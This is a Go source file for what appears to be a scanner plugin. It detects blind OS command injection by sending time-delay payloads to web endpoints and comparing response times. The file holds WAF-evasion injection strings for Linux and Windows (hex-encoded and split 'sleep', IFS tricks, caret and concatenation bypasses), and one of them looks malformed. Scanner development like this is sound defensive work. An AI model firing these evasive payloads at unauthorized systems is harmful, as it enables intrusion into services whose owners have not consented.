package plugins

import (
	"DORM/models"
	"fmt"
	"math/rand"
	"net/url"
	"time"
)

// ==============================================================
// BLIND RCE — v3.0
// ==============================================================
type BlindRCEPlugin struct{}

func (p *BlindRCEPlugin) Name() string { return "Blind Command Injection (Phantom Strike v3)" }

// ── Obfuscation Engine ─────────────────────────────────────────────────────
// Generates WAF-bypassing variants of a time-delay command.
// Never sends raw "sleep N" — always obfuscated.
func generateRCEPayloads(seconds int) []struct {
	Payload string
	OS      string
} {
	s := fmt.Sprintf("%d", seconds)
	hex := func(b byte) string { return fmt.Sprintf("\\x%02x", b) }

	// Hex-encoded "sleep" for bash: \x73\x6c\x65\x65\x70
	sleepHex := ""
	for _, ch := range "sleep" {
		sleepHex += hex(byte(ch))
	}

	// Randomised inline variable split to bypass static WAF rules
	// e.g. s=sl;e=eep;$s$e 5  →  varies each call for entropy
	letters := []string{"sl", "sle", "slee"}
	pick := letters[rand.Intn(len(letters))]
	tail := "sleep"[len(pick):]

	pingN := fmt.Sprintf("%d", seconds+1) // ping -n (n) sends n-1 ICMP, so +1

	return []struct {
		Payload string
		OS      string
	}{
		// ── Linux / Unix ──────────────────────────────────────────────
		{fmt.Sprintf("sleep${IFS}%s", s), "linux"},
		{fmt.Sprintf("$(sleep${IFS}%s)", s), "linux"},
		{fmt.Sprintf("|sleep${IFS}%s", s), "linux"},
		{fmt.Sprintf(";sleep${IFS}%s", s), "linux"},
		{fmt.Sprintf("&sleep${IFS}%s&", s), "linux"},
		{fmt.Sprintf("$($'%s'${IFS}%s)", sleepHex, s), "linux"},            // hex encoded binary
		{fmt.Sprintf("a=%s;b=%s;$a$b %s", pick, tail, s), "linux"},         // inline var split
		{fmt.Sprintf("{sleep,${IFS}%s}", s), "linux"},                      // brace expansion
		{fmt.Sprintf("s%sleop${IFS}%s", url.QueryEscape("|"), s), "linux"}, // partial encode
		{fmt.Sprintf("$(printf 'sleep %s'|sh)", s), "linux"},               // printf+sh
		// ── Windows / PowerShell ──────────────────────────────────────
		{fmt.Sprintf("p^i^n^g -n %s 127.0.0.1", pingN), "windows"},             // cmd caret bypass
		{fmt.Sprintf("pi''ng -n %s 127.0.0.1", pingN), "windows"},              // empty string bypass
		{fmt.Sprintf("&ping -n %s 127.0.0.1", pingN), "windows"},               // ampersand chain
		{fmt.Sprintf("timeout /T %s /NOBREAK >nul", s), "windows"},             // timeout cmd
		{fmt.Sprintf("&('sl'+'eep') %s", s), "windows"},                        // PS string concat
		{fmt.Sprintf("[System.Threading.Thread]::Sleep(%s000)", s), "windows"}, // PS full sleep
		{fmt.Sprintf("powershell -c Start-Sleep -Seconds %s", s), "windows"},   // PS flag
	}
}

// ── Adaptive Delta Analysis ────────────────────────────────────────────────
// Phase 1: measure RTT baseline (3 clean GETs, take average)
// Phase 2: fire sleep-2 payload → if delta < (2s - tolerance) → likely FP → skip
// Phase 3: fire sleep-7 payload → if delta ≈ delta_2 * (7/2) ± 20% → CONFIRMED
func measureBaseline(target models.ScanTarget, endpoint string) time.Duration {
	client := models.GetClient()
	u := getURL(target, endpoint)
	var total time.Duration
	samples := 0
	for i := 0; i < 3; i++ {
		start := time.Now()
		resp, err := client.Get(u)
		elapsed := time.Since(start)
		if err == nil {
			resp.Body.Close()
			total += elapsed
			samples++
		}
	}
	if samples == 0 {
		return 500 * time.Millisecond // fallback
	}
	return total / time.Duration(samples)
}

func (p *BlindRCEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	endpoints := []string{
		"/", "/ping.php", "/status.php", "/check.php", "/test.php",
		"/admin.php", "/exec.php", "/cmd.php", "/run.php", "/api/exec",
		"/api/run", "/api/ping", "/api/status",
	}
	params := []string{
		"cmd", "ip", "host", "addr", "query", "file", "download",
		"path", "exec", "command", "ping", "target", "run", "shell",
	}

	// Pre-generate both probe sets (2s and 7s)
	probes2 := generateRCEPayloads(2)
	probes7 := generateRCEPayloads(7)

	// ── PHASE 1: Static endpoint fuzzing ─────────────────────────────
	for _, ep := range endpoints {
		baseline := measureBaseline(target, ep)

		for _, param := range params {
			for i, p2 := range probes2 {
				encodedPayload := url.QueryEscape(p2.Payload)
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, encodedPayload)

				// ── Step A: fire small sleep (2s) ──────────────────
				start := time.Now()
				resp, err := client.Get(targetURL)
				t1 := time.Since(start)
				if err == nil {
					resp.Body.Close()
				}

				minDelta := 2*time.Second - (baseline / 2)
				if t1 < minDelta {
					continue // baseline noise — not interesting
				}

				// ── Step B: confirm with larger sleep (7s) ──────────
				p7 := probes7[i]
				encoded7 := url.QueryEscape(p7.Payload)
				confirmURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, encoded7)

				start2 := time.Now()
				resp2, err2 := client.Get(confirmURL)
				t2 := time.Since(start2)
				if err2 == nil {
					resp2.Body.Close()
				}

				// Proportionality check: t2 should be ~3.5x t1 (7/2=3.5) ±20%
				ratio := float64(t2) / float64(t1)
				if ratio >= 2.5 && ratio <= 5.5 {
					return &models.Vulnerability{
						Target:   target,
						Name:     "Blind OS Command Injection (Phantom Strike — Confirmed)",
						Severity: "CRITICAL",
						CVSS:     9.8,
						Description: fmt.Sprintf(
							"Command injection confirmed via adaptive dual-timing delta analysis.\n"+
								"Endpoint:   %s\nParameter:  %s\n"+
								"Payload OS: %s\nSmall Probe: %s → %.2fs\nLarge Probe: %s → %.2fs\n"+
								"Ratio: %.2f (expected ~3.5 for sleep7/sleep2)\nBaseline RTT: %v",
							targetURL, param, p2.OS,
							p2.Payload, t1.Seconds(),
							p7.Payload, t2.Seconds(),
							ratio, baseline,
						),
						Solution:  "Disable system command execution functions. Use allow-list input validation.",
						Reference: "OWASP A03:2021 – Injection / CWE-78",
					}
				}
			}
		}
	}

	// ── PHASE 2: Spider-discovered GET endpoints ──────────────────────
	key := "endpoints_" + target.IP
	existing, ok := models.SharedData.Load(key)
	if !ok {
		return nil
	}
	spiderEndpoints := existing.([]models.Endpoint)

	for _, ep := range spiderEndpoints {
		if ep.Method == "GET" && len(ep.Params) > 0 {
			baseline := measureBaseline(target, "/")

			for _, param := range ep.Params {
				for i, p2 := range probes2 {
					parsedURL, err := url.Parse(ep.URL)
					if err != nil {
						continue
					}
					q := parsedURL.Query()
					q.Set(param, p2.Payload)
					parsedURL.RawQuery = q.Encode()

					start := time.Now()
					resp, err := client.Get(parsedURL.String())
					t1 := time.Since(start)
					if err == nil {
						resp.Body.Close()
					}

					minDelta := 2*time.Second - (baseline / 2)
					if t1 < minDelta {
						continue
					}

					// Confirm with sleep-7
					p7 := probes7[i]
					q.Set(param, p7.Payload)
					parsedURL.RawQuery = q.Encode()

					start2 := time.Now()
					resp2, err2 := client.Get(parsedURL.String())
					t2 := time.Since(start2)
					if err2 == nil {
						resp2.Body.Close()
					}

					ratio := float64(t2) / float64(t1)
					if ratio >= 2.5 && ratio <= 5.5 {
						return &models.Vulnerability{
							Target:   target,
							Name:     "Blind OS Command Injection (Spider-Discovered — Confirmed)",
							Severity: "CRITICAL",
							CVSS:     9.8,
							Description: fmt.Sprintf(
								"Command injection confirmed on spider-discovered endpoint.\n"+
									"URL: %s\nParameter: %s\nPayload OS: %s\n"+
									"t1(sleep2): %.2fs | t2(sleep7): %.2fs | Ratio: %.2f",
								ep.URL, param, p2.OS, t1.Seconds(), t2.Seconds(), ratio,
							),
							Solution:  "Disable system command execution functions. Use allow-list input validation.",
							Reference: "OWASP A03:2021 – Injection / CWE-78",
						}
					}
				}
			}
		}

		// ── PHASE 3: Spider-discovered POST endpoints ─────────────────
		if ep.Method == "POST" && len(ep.Params) > 0 {
			baseline := measureBaseline(target, "/")

			for _, param := range ep.Params {
				for i, p2 := range probes2 {
					formData := url.Values{}
					formData.Set(param, p2.Payload)

					start := time.Now()
					resp, err := client.PostForm(ep.URL, formData)
					t1 := time.Since(start)
					if err == nil {
						resp.Body.Close()
					}

					minDelta := 2*time.Second - (baseline / 2)
					if t1 < minDelta {
						continue
					}

					p7 := probes7[i]
					formData.Set(param, p7.Payload)

					start2 := time.Now()
					resp2, err2 := client.PostForm(ep.URL, formData)
					t2 := time.Since(start2)
					if err2 == nil {
						resp2.Body.Close()
					}

					ratio := float64(t2) / float64(t1)
					if ratio >= 2.5 && ratio <= 5.5 {
						return &models.Vulnerability{
							Target:   target,
							Name:     "Blind OS Command Injection (POST — Confirmed)",
							Severity: "CRITICAL",
							CVSS:     9.8,
							Description: fmt.Sprintf(
								"Command injection confirmed via POST parameter.\n"+
									"URL: %s\nParameter: %s\nPayload OS: %s\n"+
									"t1(sleep2): %.2fs | t2(sleep7): %.2fs | Ratio: %.2f\nBaseline: %v",
								ep.URL, param, p2.OS, t1.Seconds(), t2.Seconds(), ratio, baseline,
							),
							Solution:  "Disable system command execution functions. Use allow-list input validation.",
							Reference: "OWASP A03:2021 – Injection / CWE-78",
						}
					}
				}
			}
		}
	}

	return nil
}
